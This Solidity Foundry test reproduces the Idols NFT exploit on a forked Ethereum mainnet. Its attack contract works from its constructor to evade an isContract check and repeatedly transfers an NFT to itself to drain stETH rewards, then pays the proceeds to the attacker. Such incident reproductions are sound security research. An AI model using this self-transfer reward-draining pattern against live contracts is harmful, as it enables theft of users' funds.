// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 97 stETH
// Attacker : https://etherscan.io/address/0xe546480138d50bb841b204691c39cc514858d101
// Attack Contract : https://etherscan.io/address/0x22d22134612c0741ebdb3b74a58842d6e74e3b16
// Vulnerable Contract : https://etherscan.io/address/0x439cac149b935ae1d726569800972e1669d17094
// Attack Tx : https://etherscan.io/tx/0x5e989304b1fb61ea0652db4d0f9476b8882f27191c1f1d2841f8977cb8c5284c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x439cac149b935ae1d726569800972e1669d17094#code

// @Analysis
// Post-mortem : https://rekt.news/theidolsnft-rekt
// Twitter Guy : https://x.com/TenArmorAlert/status/1879376744161132981
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant IDOLS_NFT = 0x439cac149B935AE1D726569800972E1669d17094;
address constant ATTACKER = 0xE546480138D50Bb841B204691C39cC514858d101;
address constant ATTACKER_2 = 0x8152970a81f558d171a22390E298B34Be8d40CF4;
address constant ST_ETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
uint256 constant TOKEN_ID = 940;

contract IdolsNFT is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21624139 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = ST_ETH;
    }

    function testExploit() public balanceLog {
        address contractAddress = vm.computeCreateAddress(address(this), vm.getNonce(address(this)));

        vm.prank(ATTACKER);
        IIDOLS(IDOLS_NFT).safeTransferFrom(ATTACKER, contractAddress, TOKEN_ID);

        new AttackContract();

        // This process repeated 15 times between block 21624128 and block 21626362
        // ref: https://etherscan.io/txs?a=0xe546480138d50bb841b204691c39cc514858d101&p=3
    }
}

contract AttackContract {
    // Put code in the constructor will bypass the Address.isContract() check
    constructor() {
        for (uint256 i = 0; i < 2000; i++) {
            uint256 totalRewards = IIDOLS(IDOLS_NFT).allocatedStethRewards();
            uint256 rewardPerGod = IIDOLS(IDOLS_NFT).rewardPerGod();
            if (rewardPerGod > totalRewards) {
                break;
            }
            // Transferring an NFT gives rewards to both sender and receiver.
            // Using safeTransferFrom with same sender/receiver exploits this to earn rewards
            // without actually losing the NFT token
            IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), address(this), TOKEN_ID);
        }

        // Transfer all stETH and NFT token back to attacker
        uint256 stEthAmount = IERC20(ST_ETH).balanceOf(address(this));
        IERC20(ST_ETH).transfer(msg.sender, stEthAmount);
        IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), ATTACKER, TOKEN_ID);
        IERC20(ST_ETH).approve(ATTACKER_2, type(uint256).max);
        IERC20(ST_ETH).approve(msg.sender, type(uint256).max);

        // Self-destruct the contract
        selfdestruct(payable(msg.sender));
    }
}

interface IIDOLS is IERC721 {
    function allocatedStethRewards() external view returns (uint256);
    function rewardPerGod() external view returns (uint256);
}
